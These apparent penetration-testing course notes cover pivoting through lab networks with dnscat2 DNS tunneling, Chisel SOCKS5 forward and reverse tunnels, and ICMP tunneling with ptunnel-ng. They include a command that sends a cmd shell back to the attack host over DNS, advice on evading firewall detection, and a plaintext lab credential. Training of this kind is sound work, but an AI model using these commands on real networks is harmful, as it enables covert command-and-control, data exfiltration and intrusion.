# Branching Out Our Tunnels

## 1.DNS Tunneling with Dnscat2

> [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

## 1.Setting Up & Using dnscat2

### **Cloning dnscat2 and Setting Up the Server**

```shell-session
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

* We can then start the dnscat2 server by executing the dnscat2 file.

### Starting the dnscat2 server

```shell-session
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

```shell-session
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

> After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

### Cloning dnscat2-powershell to the Attack Host

```shell-session
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.

### Importing dnscat2.ps1

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

> We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

### Confirming Session Establishment

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

We can list the options we have with dnscat2 by entering `?` at the prompt.

### Listing dnscat2 Options

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

> We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.

### Interacting with the Established Session

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

***

## 2.SOCKS5 Tunneling with Chisel

> [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

## Setting Up & Using Chisel

> Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:

### **Cloning Chisel**

```shell-session
git clone https://github.com/jpillora/chisel.git
```

> We will need the programming language `Go` installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use `go build` to build the Chisel binary.

> Note: Depending on the version of the `glibc` library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of `chisel`, which can be found in the `Releases` section of the GitHub repository.

### Building the Chisel Binary

```shell-session
cd chisel
go build
```

> It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)" and IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM\&t=1469s).
>
> Once the binary is built, we can use `SCP` to transfer it to the target pivot host.

### Transferring Chisel Binary to Pivot Host

```shell-session
scp chisel ubuntu@10.129.202.64:~/
```

Then we can start the Chisel server/listener.

### Running the Chisel Server on the Pivot Host

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```

> The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
>
> We can start a client on our attack host and connect to the Chisel server.

### **Connecting to the Chisel Server**

```shell-session
./chisel client -v 10.129.202.64:1234 socks
```

> As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

### **Editing & Confirming proxychains.conf**

```shell-session
tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

### Pivoting to the DC

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

***

## Chisel Reverse Pivot

> In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
>
> When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.\
> \
> We'll start the server in our attack host with the option `--reverse`.

### Starting the Chisel Server on our Attack Host

```shell-session
sudo ./chisel server --reverse -v -p 1234 --socks5
```

* Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

### **Connecting the Chisel Client to our Attack Host**

```shell-session
./chisel client -v 10.10.14.17:1234 R:socks
```

* We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

### Editing & Confirming proxychains.conf

```shell-session
tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

> Note: If you are getting an error message with chisel on the target, try with a [different version](https://github.com/jpillora/chisel/releases).

***

## 3.ICMP Tunneling with SOCKS

> ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.
>
> We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.

### Setting Up & Using ptunnel-ng

If ptunnel-ng is not on our attack host, we can clone the project using git.

### Cloning Ptunnel-ng

```shell-session
git clone https://github.com/utoni/ptunnel-ng.git
```

Once the ptunnel-ng repo is cloned to our attack host, we can run the `autogen.sh` script located at the root of the ptunnel-ng directory.

### Building Ptunnel-ng with Autogen.sh

```shell-session
sudo ./autogen.sh
```

> After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the `-r` option with SCP.

### Alternative approach of building a static binary

```shell-session
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

### Transferring Ptunnel-ng to the Pivot Host

```shell-session
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.

### **Starting the ptunnel-ng Server on the Target Host**

```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

> The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.
>
> Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

### **Connecting to ptunnel-ng Server from Attack Host**

```shell-session
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

### Tunneling an SSH connection through an ICMP Tunnel

```shell-session
ssh -p2222 -lubuntu 127.0.0.1
```

> If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.
>
> On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.

### **Viewing Tunnel Traffic Statistics**

```shell-session
inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

### **Enabling Dynamic Port Forwarding over SSH**

```shell-session
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.

### **Proxychaining through the ICMP Tunnel**

```shell-session
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

## Network Traffic Analysis Considerations

> It is important that we confirm the tools we are using are performing as advertised and that we have set up & are operating them properly. In the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, we can benefit from analyzing the traffic we generate with a packet analyzer like `Wireshark`. Take a close look at the short clip below.

{% embed url="<https://academy.hackthebox.com/storage/modules/158/analyzingTheTraffic.gif>" %}

> In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that `TCP` & `SSHv2` traffic is captured.
>
> The command used in the clip: `ssh ubuntu@10.129.202.64`
>
> In the second part of this clip, a connection is established over SSH using ICMP tunneling. Notice the type of traffic that is captured when this is performed.
>
> Command used in clip: `ssh -p2222 -lubuntu 127.0.0.1`
>
> \
> **Note:** Consider the versions of GLIBC, make sure you are on par with the one on the target.
